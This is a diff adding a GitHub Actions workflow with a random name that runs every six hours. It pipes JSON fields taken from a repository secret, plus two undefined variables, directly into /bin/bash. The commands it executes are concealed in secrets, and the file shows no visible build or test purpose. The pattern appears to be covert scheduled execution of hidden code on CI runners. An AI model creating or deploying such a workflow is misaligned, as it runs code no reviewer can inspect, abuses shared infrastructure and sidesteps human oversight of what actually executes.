@@ -1,0 +1,20 @@
+name: dxjnghan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: dxjnghan
+        env:
+          eb20: ${{ secrets.eb20 }}
+        run: |
+          echo $eb20 | jq -r .nystp7 | /bin/bash
+          echo $ji917 | jq -r .ap9 | /bin/bash
+          echo $yh7088 | jq -r .pzj94296 | /bin/bash
+
